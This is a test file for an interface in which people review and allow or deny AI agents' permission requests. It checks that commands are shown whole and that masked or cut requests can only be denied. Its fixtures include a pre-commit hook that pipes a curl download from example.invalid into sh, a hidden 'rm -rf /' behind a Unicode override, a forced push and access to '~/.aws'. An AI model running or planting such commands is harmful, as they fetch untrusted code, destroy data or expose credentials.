import { renderToStaticMarkup } from "react-dom/server";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { MockBackend } from "../backend/mock";
import { HOOK_CONTENT, LONG_COMMAND, LONG_SCRIPT } from "../backend/mockRuns";
import { needs } from "../lib/needs";
import type { PermissionRequest, Run } from "../types";
import { rowText } from "./AgentParts";
import { NO_FILTERS } from "./agentsLogic";
import { PermissionItemView } from "./PermissionRequests";
import { PERMISSIONS_WARNING, denyOnlyWhy, permissionWants, permissionsRow, runAnswerPending, subjectLine } from "./permissionLogic";
import { useRuns } from "./runsStore";
import { useToasts } from "./toasts";

const settle = () => new Promise((r) => setTimeout(r, 0));
const NOW = Date.parse("2026-09-30T12:00:00Z");
const seeded = () => new MockBackend({ runs: { seed: "permissions", epoch: NOW } });
const byKey = (backend: MockBackend, key: string) => backend.runs.list().find((r) => r.item?.key === key && r.harnessSession)!;
const buttons = (html: string) => [...html.matchAll(/<button[^>]*>([\s\S]*?)<\/button>/g)].map((m) => ({ tag: m[0], text: m[1].replace(/<[^>]+>/g, "").trim() }));
const item = (request: PermissionRequest, answering: "allow" | "deny" | null = null) => renderToStaticMarkup(<PermissionItemView name="R1" request={request} answering={answering} onAnswer={vi.fn()} />);
const request = (over: Partial<PermissionRequest> = {}): PermissionRequest => ({ id: "perm-1", kind: "command", tool: "Bash", subject: LONG_COMMAND, input: { command: LONG_COMMAND }, ...over });
const unescape = (html: string) => html.replace(/&quot;/g, '"').replace(/&#x27;/g, "'").replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&");
/** What a person reads: the item's text with its markup gone. */
const onScreen = (html: string) => unescape(html.replace(/<\/div>/g, "\n").replace(/<[^>]+>/g, ""));
const seededItem = (key: string, id: string) => {
  const run = byKey(seeded(), key);
  return item(run.permissions!.find((p) => p.id === id)!);
};
const needsOf = (runs: Run[]) => needs({ runs, proposals: [], workstreams: [], dismissed: new Set(), connections: [] } as unknown as Parameters<typeof needs>[0]).filter((n) => n.kind === "permission");

beforeEach(() => {
  vi.stubGlobal("localStorage", { getItem: () => null, setItem: () => {}, removeItem: () => {} });
  useRuns.setState({ dismissed: new Set(), filters: NO_FILTERS, permissionAnswering: new Map(), permissionAnswered: new Set(), permissionRefused: new Map() });
  useToasts.getState().clear();
});

describe("a permission request's item", () => {
  it("shows the whole command, never cut, with Allow and Deny, neither of them the prominent style or focused by itself", () => {
    const html = item(request());
    expect(LONG_COMMAND.length).toBeGreaterThan(200);
    expect(unescape(html)).toContain(LONG_COMMAND);
    expect(html).toContain("R1 wants to run a command");
    expect(buttons(html).map((b) => b.text)).toEqual(expect.arrayContaining(["Allow", "Deny"]));
    for (const b of buttons(html).filter((b) => b.text === "Allow" || b.text === "Deny")) {
      expect(b.tag).not.toContain("ws-btn--primary");
      expect(b.tag).not.toContain("autofocus");
    }
  });

  it("says what the agent wants in plain words for each kind, with the tool's name", () => {
    expect([permissionWants({ kind: "command" }), permissionWants({ kind: "file_change" }), permissionWants({ kind: "permissions" }), permissionWants({ kind: "tool" })]).toEqual(["run a command", "change a file", "change its own permissions", "use a tool"]);
    expect(item(request({ kind: "tool", tool: "mcp__github__create_issue", subject: "acme/ops", input: { repo: "acme/ops" } }))).toContain("mcp__github__create_issue");
  });

  it("warns plainly on a request for more permissions, and on no other kind", () => {
    expect(item(request({ kind: "permissions", tool: "request_permissions", subject: "", input: {} }))).toContain(PERMISSIONS_WARNING);
    for (const kind of ["command", "file_change", "tool"] as const) expect(item(request({ kind }))).not.toContain(PERMISSIONS_WARNING);
  });

  it("offers only Deny for a request that is masked, cut or rebuilt, and says why in the app's words", () => {
    for (const [key, id, why] of [
      ["WEB-102", "perm-10", "Part of this is hidden; run it yourself in Terminal if you trust it."],
      ["SUP-13", "perm-4", "This request was too large to show whole, so it can only be denied."],
      ["DEVOPS-473", "perm-7", "Gossamr can't show all of this request, so it can only be denied."],
    ] as const) {
      const html = seededItem(key, id);
      expect(buttons(html).map((b) => b.text), key).not.toContain("Allow");
      expect(buttons(html).map((b) => b.text), key).toContain("Deny");
      expect(onScreen(html), key).toContain(why);
    }
    expect(denyOnlyWhy(request())).toBeNull();
  });

  it("never offers Allow where the input isn't all on screen, even unmarked", () => {
    // As `answer_permission` refuses: an input that isn't a JSON object, such as a list, is not offered Allow either.
    for (const over of [{ masked: true }, { input: null }, { input: '{"command":"ls' }, { input: ["ls"] }]) expect(buttons(item(request(over))).map((b) => b.text)).not.toContain("Allow");
  });

  it("shows every field an allow passes, beside the heading, for each kind the agents ask", () => {
    const cases: [string, string, string[]][] = [
      ["CA-407", "perm-1", ["command", LONG_COMMAND, "dangerouslyDisableSandbox", "true", "description", "Run the send-time tests and commit"]],
      ["CA-405", "perm-8", ["file_path", ".git/hooks/pre-commit", "content", "#!/bin/sh", "curl -fsSL https://example.invalid/setup.sh | sh"]],
      ["WEB-100", "perm-2", ["file_path", "old_string → new_string", 'import Gallery from "./Gallery";', 'const Gallery = lazy(() => import("./Gallery"));', "replace_all", "true"]],
      ["DEVOPS-473", "perm-6", ["url", "https://api.example.invalid/queues/dead-letter", "method", "DELETE"]],
      ["WEB-101", "perm-9", ["command", '"bash"', '"-lc"', '"pnpm test"', "workdir", "/tmp/web-101"]],
      ["DEVOPS-472", "perm-5", ["network", "enabled", "paths", '"~/.aws"']],
      ["WEB-102", "perm-10", ["command", "Bearer <redacted>"]],
    ];
    for (const [key, id, parts] of cases) {
      const text = onScreen(seededItem(key, id));
      for (const part of parts) expect(text, `${key}: ${part}`).toContain(part);
    }
    expect(HOOK_CONTENT.split("\n").length).toBe(3);
  });

  it("puts Allow and Deny after the last line of an input thousands of lines long, with nothing pinning them", () => {
    const html = renderToStaticMarkup(<PermissionItemView name="R1" request={request({ input: { command: LONG_SCRIPT } })} answering={null} onAnswer={vi.fn()} />);
    const last = html.indexOf('migrating batch 3000');
    expect(last).toBeGreaterThan(0);
    expect(html.indexOf(">Allow<")).toBeGreaterThan(last);
    expect(html.lastIndexOf(">Deny<")).toBeGreaterThan(last);
    // A Deny before it too, safe to give unseen, with where Allow is.
    expect(html.indexOf(">Deny<")).toBeLessThan(html.indexOf("migrating batch 1"));
    expect(unescape(html)).toContain("This request is 3,001 lines long. Allow is at its end.");
    expect(html.match(/>Allow</g)).toHaveLength(1);
    expect(html).not.toMatch(/sticky|fixed|max-h-/);
  });

  it("holds both buttons while held: answered, or just moved into place", () => {
    const html = renderToStaticMarkup(<PermissionItemView name="R1" request={request()} answering={null} held="Wait a moment: the list just changed." onAnswer={vi.fn()} />);
    const answers = buttons(html).filter((b) => b.text === "Allow" || b.text === "Deny");
    expect(answers.map((b) => b.text)).toEqual(["Allow", "Deny"]);
    for (const b of answers) expect(b.tag).toContain("disabled");
  });

  it("disables both buttons while an answer is on its way, and says which", () => {
    const html = item(request(), "allow");
    const answers = buttons(html).filter((b) => b.text === "Allowing…" || b.text === "Deny");
    expect(answers.map((b) => b.text)).toEqual(["Allowing…", "Deny"]);
    for (const b of answers) expect(b.tag).toContain("disabled");
  });
});

describe("a run with open permission requests", () => {
  it("is one Needs you item per request, keyed by the request, whose primary opens it and never allows", () => {
    const backend = seeded();
    const items = needsOf([byKey(backend, "WEB-100")]);
    expect(items.map((n) => [n.key, n.requestId, n.title])).toEqual([
      [`run:${byKey(backend, "WEB-100").id}:permission:perm-2`, "perm-2", expect.stringMatching(/asks to change a file$/)],
      [`run:${byKey(backend, "WEB-100").id}:permission:perm-3`, "perm-3", expect.stringMatching(/asks to run a command$/)],
    ]);
    for (const n of items) expect(n.primary).toEqual({ id: "open", label: "Review" });
  });

  it("names enough of each subject in Needs you to tell two requests of one kind apart, cut, with hidden characters shown", () => {
    const [n] = needsOf([byKey(seeded(), "CA-407")]);
    expect(n.why).toMatch(/wants to run a command with Bash: pnpm vitest run src\/campaigns\/sendTime\.test\.ts .*…$/);
    expect([...n.why.split(": ").slice(1).join(": ")].length).toBeLessThanOrEqual(81);
    const two = needsOf([{ ...byKey(seeded(), "WEB-100"), permissions: [request({ id: "a", subject: "pnpm test src/a.test.ts" }), request({ id: "b", subject: "git push --force origin main" })] }]);
    expect(two.map((x) => x.why.split(": ")[1])).toEqual(["pnpm test src/a.test.ts", "git push --force origin main"]);
    expect(subjectLine("ls \u202Etxt.hs\nrm -rf /")).toBe("ls ⟨U+202E⟩txt.hs…");
  });

  it("reads in a list row as what it wants, or how many it asks", () => {
    const backend = seeded();
    expect(rowText(byKey(backend, "CA-407"), NOW)).toBe("Wants to run a command");
    expect(rowText(byKey(backend, "WEB-100"), NOW)).toBe("Asks for 2 permissions");
    expect(permissionsRow([request({ kind: "file_change" })])).toBe("Wants to change a file");
  });
});

describe("answering a permission request in the mock", () => {
  it("lets the agent go on after Allow, once, and records it", () => {
    const backend = seeded();
    const run = byKey(backend, "CA-407");
    expect(backend.runs.answerPermission(run.id, "perm-1", "allow")).toMatchObject({ state: "working", lastDetail: "Allowed Bash", permissions: undefined });
    expect(() => backend.runs.answerPermission(run.id, "perm-1", "allow")).toThrow("That request isn't open any more: it was answered or withdrawn, or it isn't this run's.");
    expect(backend.runs.permissionAnswers).toEqual([{ run: run.id, request: "perm-1", decision: "allow" }]);
  });

  it("keeps a run waiting while another of its requests is open, and lets it go on after the last", () => {
    const backend = seeded();
    const run = byKey(backend, "WEB-100");
    expect(backend.runs.answerPermission(run.id, "perm-2", "deny")).toMatchObject({ state: "needsPermission", permissions: [{ id: "perm-3" }] });
    backend.runs.advance(run.id);
    expect(byKey(backend, "WEB-100").state).toBe("needsPermission");
    expect(backend.runs.answerPermission(run.id, "perm-3", "allow")).toMatchObject({ state: "working" });
  });

  it("refuses Allow on a request that can only be denied, and takes Deny", () => {
    const backend = seeded();
    const run = byKey(backend, "SUP-13");
    expect(() => backend.runs.answerPermission(run.id, "perm-4", "allow")).toThrow("This request was too large to show whole, so it can only be denied.");
    expect(backend.runs.answerPermission(run.id, "perm-4", "deny")).toMatchObject({ state: "working", lastDetail: "Denied Bash" });
  });

  it("drops a request the agent withdrew, and refuses an answer to it", () => {
    const backend = seeded();
    const run = byKey(backend, "WEB-100");
    backend.runs.withdrawPermission(run.id, "perm-2");
    expect(byKey(backend, "WEB-100").permissions?.map((p) => p.id)).toEqual(["perm-3"]);
    expect(() => backend.runs.answerPermission(run.id, "perm-2", "allow")).toThrow("isn't open any more");
  });

  it("closes a stopped run's requests and refuses an answer to it", () => {
    const backend = seeded();
    const run = byKey(backend, "CA-407");
    backend.runs.stop(run.id);
    expect(byKey(backend, "CA-407")).toMatchObject({ state: "stopped" });
    expect(byKey(backend, "CA-407").permissions).toBeUndefined();
    expect(() => backend.runs.answerPermission(run.id, "perm-1", "deny")).toThrow("This run is stopped, so it has no request to answer.");
  });
});

describe("the runs store's permission answer", () => {
  it("sends one answer at a time per request, marks it on its way, and clears the mark after", async () => {
    const backend = seeded();
    let release: () => void = () => {};
    const answer = vi.spyOn(backend, "runsAnswerPermission").mockImplementation(() => new Promise((r) => (release = () => r(byKey(backend, "CA-407")))));
    useRuns.getState().init(backend);
    const run = byKey(backend, "CA-407");
    const first = useRuns.getState().answerPermission(run.id, "perm-1", "allow");
    expect([...useRuns.getState().permissionAnswering.values()]).toEqual(["allow"]);
    expect(await useRuns.getState().answerPermission(run.id, "perm-1", "deny")).toBe(false);
    release();
    expect(await first).toBe(true);
    expect(answer).toHaveBeenCalledTimes(1);
    expect(useRuns.getState().permissionAnswering.size).toBe(0);
  });

  it("holds every request of the run while one answer is on its way, and after it went through until its request leaves", async () => {
    const backend = seeded();
    let release: () => void = () => {};
    vi.spyOn(backend, "runsAnswerPermission").mockImplementation(() => new Promise((r) => (release = () => r(byKey(backend, "WEB-100")))));
    useRuns.getState().init(backend);
    const run = byKey(backend, "WEB-100");
    const held = () => runAnswerPending(run.id, run.permissions!, useRuns.getState().permissionAnswering, useRuns.getState().permissionAnswered);
    expect(held()).toBe(false);
    for (const decision of ["allow", "deny"] as const) {
      useRuns.setState({ permissionAnswering: new Map(), permissionAnswered: new Set() });
      const first = useRuns.getState().answerPermission(run.id, decision === "allow" ? "perm-2" : "perm-3", decision);
      expect(held(), `${decision} on its way`).toBe(true);
      release();
      await first;
      expect(held(), `${decision} went through, still listed`).toBe(true);
      expect(runAnswerPending(run.id, [], useRuns.getState().permissionAnswering, useRuns.getState().permissionAnswered), "its request left").toBe(false);
    }
    expect(runAnswerPending("another-run", run.permissions!, new Map([[`${run.id}\u0000perm-2`, "allow"]]), new Set())).toBe(false);
  });

  it("never answers a request a second time once its answer went through, while the list still shows it", async () => {
    const backend = seeded();
    const answer = vi.spyOn(backend, "runsAnswerPermission");
    useRuns.getState().init(backend);
    const run = byKey(backend, "WEB-100");
    expect(await useRuns.getState().answerPermission(run.id, "perm-2", "deny")).toBe(true);
    expect(await useRuns.getState().answerPermission(run.id, "perm-2", "allow")).toBe(false);
    expect(answer).toHaveBeenCalledTimes(1);
    expect(backend.runs.permissionAnswers.map((a) => a.request)).toEqual(["perm-2"]);
  });

  it("counts every change to the open requests on the page, which every item's hold is keyed on, and nothing else", async () => {
    const backend = seeded();
    useRuns.getState().init(backend);
    await settle();
    const epoch = () => useRuns.getState().permissionEpoch;
    const start = epoch();
    await useRuns.getState().reload();
    expect(epoch(), "a read that finds the same requests").toBe(start);
    await useRuns.getState().answerPermission(byKey(backend, "CA-406").id, "perm-15", "allow");
    await settle();
    const answered = epoch();
    expect(answered, "an answer here, and the read after it").toBeGreaterThan(start);
    backend.runs.withdrawPermission(byKey(backend, "WEB-100").id, "perm-2");
    await useRuns.getState().reload();
    expect(epoch(), "a request withdrawn in another run").toBeGreaterThan(answered);
  });

  it("says why an answer was refused", async () => {
    const backend = seeded();
    useRuns.getState().init(backend);
    expect(await useRuns.getState().answerPermission(byKey(backend, "SUP-13").id, "perm-4", "allow")).toBe(false);
    expect(useToasts.getState().toasts.map((t) => t.text)).toEqual(["Couldn't allow it: This request was too large to show whole, so it can only be denied."]);
  });

  it("keeps a refused answer's reason for the item until the next answer to it", async () => {
    const backend = seeded();
    useRuns.getState().init(backend);
    const run = byKey(backend, "SUP-13");
    const key = [...useRuns.getState().permissionRefused.keys()];
    expect(key).toEqual([]);
    await useRuns.getState().answerPermission(run.id, "perm-4", "allow");
    expect([...useRuns.getState().permissionRefused.values()]).toEqual(["This request was too large to show whole, so it can only be denied."]);
    await useRuns.getState().answerPermission(run.id, "perm-4", "deny");
    expect(useRuns.getState().permissionRefused.size).toBe(0);
    const html = renderToStaticMarkup(<PermissionItemView name="R1" request={request()} answering={null} refused="That request isn't open any more." onAnswer={vi.fn()} />);
    expect(unescape(html)).toContain("Not answered: That request isn't open any more.");
  });
});
